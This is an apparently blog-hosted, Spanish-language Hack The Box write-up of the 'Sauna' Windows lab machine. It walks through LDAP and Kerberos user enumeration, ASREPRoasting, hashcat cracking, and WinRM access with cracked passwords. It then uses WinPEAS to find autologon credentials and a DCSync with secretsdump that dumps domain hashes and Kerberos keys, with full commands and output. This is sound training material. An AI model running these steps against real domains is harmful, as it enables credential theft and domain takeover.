---
layout: single
title: Sauna - Hack The Box
excerpt: "Sauna is an easy difficulty Windows machine that features Active Directory enumeration and exploitation. Possible usernames can be derived from employee full names listed on the website. With these usernames, an ASREPRoasting attack can be performed, which results in hash for an account that doesn&amp;amp;#039;t require Kerberos pre-authentication. This hash can be subjected to an offline brute force attack, in order to recover the plaintext password for a user that is able to WinRM to the box. Running WinPEAS reveals that another system user has been configured to automatically login and it identifies their password. This second user also has Windows remote management permissions. BloodHound reveals that this user has the *DS-Replication-Get-Changes-All* extended right, which allows them to dump password hashes from the Domain Controller in a DCSync attack. Executing this attack returns the hash of the primary domain administrator, which can be used with Impacket&amp;amp;#039;s psexec.py in order to gain a shell on the box as 'NT_AUTHORITY\SYSTEM'."
date: 2025-06-29
classes: wide
header:
  teaser: /img2/sauna.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Windows
  - Easy
tags:
  - Information Leakage
  - Ldap Enumeration
  - Kerberos User Enumeration - Kerbrute
  - ASRepRoast Attack (GetNPUsers)
  - Cracking Hashes
  - System Enumeration - WinPEAS
  - AutoLogon Credentials
  - BloodHound - SharpHound.ps1
  - DCSync Attack - Secretsdump [Privilege Escalation]
  - PassTheHash
---


## Reconnaissance

- Nmap

```bash
❯ nmap -sS --open -p- --min-rate 5000 -n -Pn 10.10.10.175
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-29 12:07 CEST
Nmap scan report for 10.10.10.175
Host is up (0.037s latency).
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49669/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49677/tcp open  unknown
49689/tcp open  unknown
49696/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 26.44 seconds
```

- Crackmapexec

```bash
❯ crackmapexec smb 10.10.10.175
```

```ruby
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing WINRM protocol database
[*] Initializing LDAP protocol database
[*] Initializing SSH protocol database
[*] Initializing MSSQL protocol database
[*] Initializing SMB protocol database
[*] Initializing FTP protocol database
[*] Initializing RDP protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         10.10.10.175    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
```

- Add domain to /etc/hosts

```bash
❯ echo "10.10.10.175 EGOTISTICAL-BANK.LOCAL" >> /etc/hosts
```

- LDAP search

```bash
❯ ldapsearch -x -H ldap://10.10.10.175 -s base namingcontexts
```

```ruby
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

```bash
❯ ldapsearch -x -H ldap://10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'
```

```ruby
# extended LDIF
#
# LDAPv3
# base <DC=EGOTISTICAL-BANK,DC=LOCAL> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# EGOTISTICAL-BANK.LOCAL
dn: DC=EGOTISTICAL-BANK,DC=LOCAL
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL
instanceType: 5
whenCreated: 20200123054425.0Z
whenChanged: 20250628230237.0Z
subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
uSNCreated: 4099
dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAQL7gs8Yl7ESyuZ/4XESy7A==
uSNChanged: 102433
name: EGOTISTICAL-BANK
objectGUID:: 7AZOUMEioUOTwM9IB/gzYw==
replUpToDateVector:: AgAAAAAAAAAHAAAAAAAAAJ0ICBOvpfBEnih4DztqU+sXkAEAAAAAAIsFc
 R4DAAAARsb/VEiFdUq/CcLUBWrijxaAAQAAAAAAHXqGHAMAAACrjO940UmFRLLC7Zxl/q+tDOAAAA
 AAAAAoOP4WAwAAANzRVIHxYS5CtEQKQAnmhHUVcAEAAAAAANRuDxcDAAAA/VqFkkbeXkGqVm5qQCP
 2DAvQAAAAAAAA0PAKFQMAAACb8MWfbB18RYsV+i8aPhNOFGABAAAAAAAQ1QAXAwAAAEC+4LPGJexE
 srmf+FxEsuwJsAAAAAAAANQEUhQDAAAA
creationTime: 133956253570535405
forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 0
maxPwdAge: -36288000000000
minPwdAge: -864000000000
minPwdLength: 7
modifiedCountAtLastProm: 0
nextRid: 1000
pwdProperties: 1
pwdHistoryLength: 24
objectSid:: AQQAAAAAAAUVAAAA+o7VsIowlbg+rLZG
serverState: 1
uASCompat: 1
modifiedCount: 1
auditingPolicy:: AAE=
nTMixedDomain: 0
rIDManagerReference: CN=RID Manager$,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name
 ,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
systemFlags: -1946157056
wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOT
 ISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Progra
 m Data,DC=EGOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGO
 TISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrin
 cipals,DC=EGOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=
 EGOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=E
 GOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGO
 TISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTIC
 AL-BANK,DC=LOCAL
wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,
 DC=EGOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTIS
 TICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICA
 L-BANK,DC=LOCAL
objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,D
 C=LOCAL
isCriticalSystemObject: TRUE
gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=Syste
 m,DC=EGOTISTICAL-BANK,DC=LOCAL;0]
dSCorePropagationData: 16010101000000.0Z
otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=EGOTIS
 TICAL-BANK,DC=LOCAL
otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Servic
 e Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN
 =Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
ms-DS-MachineAccountQuota: 10
msDS-Behavior-Version: 7
msDS-PerUserTrustQuota: 1
msDS-AllUsersTrustQuota: 1000
msDS-PerUserTrustTombstonesQuota: 10
msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Na
 me,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-N
 ame,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
msDS-NcType: 0
msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE
dc: EGOTISTICAL-BANK

# Users, EGOTISTICAL-BANK.LOCAL
dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL

# Computers, EGOTISTICAL-BANK.LOCAL
dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL

# Domain Controllers, EGOTISTICAL-BANK.LOCAL
dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL

# System, EGOTISTICAL-BANK.LOCAL
dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL

# LostAndFound, EGOTISTICAL-BANK.LOCAL
dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL

# Infrastructure, EGOTISTICAL-BANK.LOCAL
dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL

# ForeignSecurityPrincipals, EGOTISTICAL-BANK.LOCAL
dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL

# Program Data, EGOTISTICAL-BANK.LOCAL
dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL

# NTDS Quotas, EGOTISTICAL-BANK.LOCAL
dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL

# Managed Service Accounts, EGOTISTICAL-BANK.LOCAL
dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL

# Keys, EGOTISTICAL-BANK.LOCAL
dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL

# TPM Devices, EGOTISTICAL-BANK.LOCAL
dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL

# Builtin, EGOTISTICAL-BANK.LOCAL
dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL

# Hugo Smith, EGOTISTICAL-BANK.LOCAL
dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL

# search reference
ref: ldap://ForestDnsZones.EGOTISTICAL-BANK.LOCAL/DC=ForestDnsZones,DC=EGOTIST
 ICAL-BANK,DC=LOCAL

# search reference
ref: ldap://DomainDnsZones.EGOTISTICAL-BANK.LOCAL/DC=DomainDnsZones,DC=EGOTIST
 ICAL-BANK,DC=LOCAL

# search reference
ref: ldap://EGOTISTICAL-BANK.LOCAL/CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOC
 AL

# search result
search: 2
result: 0 Success

# numResponses: 19
# numEntries: 15
# numReferences: 3
```

> Encontramos muchas rutas dentro de LDAP, vamos a filtrar el output.

```bash
❯ ldapsearch -x -H ldap://10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL' | grep "dn: CN="
```

```ruby
dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL
dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL
dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL
dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL
dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL
dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL
dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL
dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
```

> Vemos un posible usuario: Hugo Smith. Vamos a crear un diccionario con los posibles usuarios.

```bash
h.smith
hsmith
hugo.smith
hugosmith
```

- Kerberos User Enumeration - Kerbrute

```bash
❯ kerbrute userenum -d EGOTISTICAL-BANK.local --dc 10.10.10.175 users.txt
```

```ruby

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 06/29/25 - Ronnie Flathers @ropnop

2025/06/29 18:33:41 >  Using KDC(s):
2025/06/29 18:33:41 >  	10.10.10.175:88

2025/06/29 18:33:41 >  [+] VALID USERNAME:	hsmith@EGOTISTICAL-BANK.local
2025/06/29 18:33:41 >  Done! Tested 4 usernames (1 valid) in 0.036 seconds
```

> Usuario encontrado: hsmith.

- Information Leakage

![](/img2/Pasted%20image%2020250629184204.png)

```bash
hsmith
fsmith
scoins
hbear
btaylor
sdriver
skerb
```

```bash
❯ kerbrute userenum -d EGOTISTICAL-BANK.local --dc 10.10.10.175 users.txt
```

```ruby

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 06/29/25 - Ronnie Flathers @ropnop

2025/06/29 18:43:16 >  Using KDC(s):
2025/06/29 18:43:16 >  	10.10.10.175:88

2025/06/29 18:43:16 >  [+] VALID USERNAME:	hsmith@EGOTISTICAL-BANK.local
2025/06/29 18:43:16 >  [+] fsmith has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$fsmith@EGOTISTICAL-BANK.LOCAL:a76657dffec40333fd375c150651823a$cd9b7b73adf29240258efe91c79aacd076d8c49f08c3e3076dbfaaee37397c53e2b79f3fdbb4b4470df62f767a7c1b4818307073fe01a1e127fabd523bca0017694b7a1a18aa941c2fa5c27607f5b998af620f9342bb3141e0b611edf1ba1ba2b9794fd5917d8e606e484149a01b8c6bffc6949870ec5825ff2f36dddc5ee717ca2fc6c981e09526491ae9234f8e051fd9e14cbd96fdb8169c86f31345e39497007c6e42656ad7bdcb68781d5a81a722fadbbf1cfaeee5a9cfb7150b5e210ece833a61a73125c3184cc1f5d86098492c8acf0cfb5085f565e56081eacded11a6e5a4944baf22c367fc68dee9737125e3fb96a9b4d2f1b209040abf64614474c89164fb072fb73c1c66e08d77c656161a6d423520ec60
2025/06/29 18:43:16 >  [+] VALID USERNAME:	fsmith@EGOTISTICAL-BANK.local
2025/06/29 18:43:16 >  Done! Tested 7 usernames (2 valid) in 0.043 seconds
```

> Encontramos un hash TGT del usuario fsmith.

## Exploitation

- ASRepRoast Attack (GetNPUsers)

```bash
❯ impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -no-pass -usersfile users.txt
```

```ruby
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:731cc44bb845e65b32dc73896cbaf751$a91939f073dd9ab058cac6c7e5a6612c3aca46ed70b71602327fdcec25b5831ecc19df8962c4d1dd69f2aa19a1ceadac78122277ec64f92a32999fb243d675ffa6db8de048d63a3215a57edd31e975ab4d24b112826a118174b66dcd5abb147c7895aa5d7aed43390272598377c7a24fee1a9d78c04994e74be861ef6bc501e234c256b900b78bc9c49693832f69f2f1cc8dd4d2b396b69d81ec70c68263ad377622f5d48174fef8d604d8c2cf356f653ddc9f5c6236820d5f47d873276e948c5a87ca2bf59575bc6b8d12e6aa461696cf30d646539ec62b4d6e0af09f53f17dda61627c3a3fb4c4dafcfb36feb565bbda18ef3dff5f2cae52fa2f7b36069e17
```

- Cracking Kerberos Hash

```bash
❯ hashcat --example-hashes | grep "krb5asrep" -B 11
```

```ruby
Hash mode #18200
  Name................: Kerberos 5, etype 23, AS-REP
  Category............: Network Protocol
  Slow.Hash...........: No
  Password.Len.Min....: 0
  Password.Len.Max....: 256
  Salt.Type...........: Embedded
  Salt.Len.Min........: 0
  Salt.Len.Max........: 256
  Kernel.Type(s)......: pure, optimized
  Example.Hash.Format.: plain
  Example.Hash........: $krb5asrep$23$user@domain.com:3e156ada591263b8a...102ac [Truncated, use --mach for full length]
```

```bash
❯ hashcat -m 18200 -a 0 hash /usr/share/wordlists/rockyou.txt
```

```ruby
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-AMD Ryzen 5 5600X 6-Core Processor, 6924/13913 MB (2048 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 0 secs

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:731cc44bb845e65b32dc73896cbaf751$a91939f073dd9ab058cac6c7e5a6612c3aca46ed70b71602327fdcec25b5831ecc19df8962c4d1dd69f2aa19a1ceadac78122277ec64f92a32999fb243d675ffa6db8de048d63a3215a57edd31e975ab4d24b112826a118174b66dcd5abb147c7895aa5d7aed43390272598377c7a24fee1a9d78c04994e74be861ef6bc501e234c256b900b78bc9c49693832f69f2f1cc8dd4d2b396b69d81ec70c68263ad377622f5d48174fef8d604d8c2cf356f653ddc9f5c6236820d5f47d873276e948c5a87ca2bf59575bc6b8d12e6aa461696cf30d646539ec62b4d6e0af09f53f17dda61627c3a3fb4c4dafcfb36feb565bbda18ef3dff5f2cae52fa2f7b36069e17:Thestrokes23
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:731cc44...069e17
Time.Started.....: Sun Jun 29 18:49:19 2025 (4 secs)
Time.Estimated...: Sun Jun 29 18:49:23 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2578.6 kH/s (1.43ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10543104/14344385 (73.50%)
Rejected.........: 0/10543104 (0.00%)
Restore.Point....: 10536960/14344385 (73.46%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Tiffany95 -> Teague51
Hardware.Mon.#1..: Util: 65%

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => Started: Sun Jun 29 18:48:59 2025
Stopped: Sun Jun 29 18:49:23 2025
```

> Credenciales encontradas: jsmith:Thestrokes23

```bash
❯ crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
```

```ruby
SMB         10.10.10.175    5985   SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
HTTP        10.10.10.175    5985   SAUNA            [*] http://10.10.10.175:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 (Pwn3d!)
```

> El usuario fsmith está en el grupo Remote Management Users, por tanto podemos conectarnos con evil-winrm.

```bash
❯ evil-winrm -i 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
```

```ruby
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents> 
```

## Post-exploitation

- Rpcclient  user enumeration

```bash
❯ rpcclient -U "fsmith%Thestrokes23" 10.10.10.175
```

```ruby
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[HSmith] rid:[0x44f]
user:[FSmith] rid:[0x451]
user:[svc_loanmgr] rid:[0x454]
```

- AutoLogon Credentials

```bash
*Evil-WinRM* PS C:\Users\FSmith\Documents> ./winPEASx64.exe
```

![](/img2/Pasted%20image%2020250629190243.png)

> Credenciales encontradas: svc_loanmanager:Moneymakestheworldgoround!

- Pivoting

```bash
❯ crackmapexec winrm 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
```

```ruby
SMB         10.10.10.175    5985   SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
HTTP        10.10.10.175    5985   SAUNA            [*] http://10.10.10.175:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround! (Pwn3d!)
```

```bash
❯ evil-winrm -i 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
```

```ruby
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> 
```

- BloodHound - SharpHound.ps1

```bash
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> ./SharpHound.exe
```

```ruby
2025-06-29T17:06:55.0535405-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2025-06-29T17:06:55.1785337-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2025-06-29T17:06:55.1941568-07:00|INFORMATION|Initializing SharpHound at 5:06 PM on 6/29/2025
2025-06-29T17:06:55.3191575-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for EGOTISTICAL-BANK.LOCAL : SAUNA.EGOTISTICAL-BANK.LOCAL
2025-06-29T17:07:19.6472847-07:00|INFORMATION|Loaded cache with stats: 53 ID to type mappings.
 53 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2025-06-29T17:07:19.6629189-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2025-06-29T17:07:19.8035338-07:00|INFORMATION|Beginning LDAP search for EGOTISTICAL-BANK.LOCAL
2025-06-29T17:07:19.8504202-07:00|INFORMATION|Producer has finished, closing LDAP channel
2025-06-29T17:07:19.8504202-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2025-06-29T17:07:50.2254227-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 37 MB RAM
2025-06-29T17:08:02.8816659-07:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2025-06-29T17:08:02.9129194-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2025-06-29T17:08:03.0379147-07:00|INFORMATION|Status: 94 objects finished (+94 2.186047)/s -- Using 41 MB RAM
2025-06-29T17:08:03.0379147-07:00|INFORMATION|Enumeration finished in 00:00:43.2430467
2025-06-29T17:08:03.1160310-07:00|INFORMATION|Saving cache with stats: 53 ID to type mappings.
 53 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2025-06-29T17:08:03.1316610-07:00|INFORMATION|SharpHound Enumeration Completed at 5:08 PM on 6/29/2025! Happy Graphing!
```

- DCSync Attack - Secretsdump 

![](/img2/Pasted%20image%2020250629190952.png)

> Vemos que el usuario svc_loanmgr tiene los privilegios GetChangesAll y GetChanges, lo cual nos permite dumpear el nthash.

```bash
❯ impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.10.10.175
```

```ruby
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:1292278c601576326af580167054b0f0:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
